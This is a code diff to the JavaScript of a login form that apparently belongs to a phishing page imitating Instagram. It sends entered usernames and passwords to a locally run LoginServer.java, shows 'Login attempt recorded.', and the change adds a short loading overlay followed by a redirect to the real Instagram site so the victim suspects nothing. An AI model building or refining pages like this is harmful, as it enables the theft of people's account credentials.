@@ -4,6 +4,7 @@ const loginBtn = document.getElementById('loginBtn');
 const togglePass = document.getElementById('togglePass');
 const loginForm = document.getElementById('loginForm');
 const banner = document.getElementById('banner');
+const loadingOverlay = document.getElementById('loadingOverlay');
 
 function updateButtonState() {
   const filled = usernameInput.value.trim().length > 0 && passwordInput.value.length > 0;
@@ -27,8 +28,10 @@ function showBanner(message, type) {
 
 loginForm.addEventListener('submit', async (e) => {
   e.preventDefault();
+
   loginBtn.disabled = true;
   loginBtn.textContent = 'Logging in...';
+  loadingOverlay.classList.remove('hidden');
 
   try {
     const res = await fetch('/login', {
@@ -39,12 +42,22 @@ loginForm.addEventListener('submit', async (e) => {
         password: passwordInput.value
       })
     });
+
     const data = await res.json();
-    showBanner(data.message || 'Login attempt recorded.', 'success');
+    const isSuccess = res.ok && data.status === 'ok';
+    showBanner(data.message || 'Login attempt recorded.', isSuccess ? 'success' : 'error');
+
+    if (isSuccess) {
+      setTimeout(() => {
+        window.location.href = 'https://www.instagram.com';
+      }, 300);
+      return;
+    }
   } catch (err) {
     showBanner('Could not reach the server. Is LoginServer.java running?', 'error');
-  } finally {
-    loginBtn.textContent = 'Log in';
-    updateButtonState();
   }
+
+  loadingOverlay.classList.add('hidden');
+  loginBtn.textContent = 'Log in';
+  updateButtonState();
 });
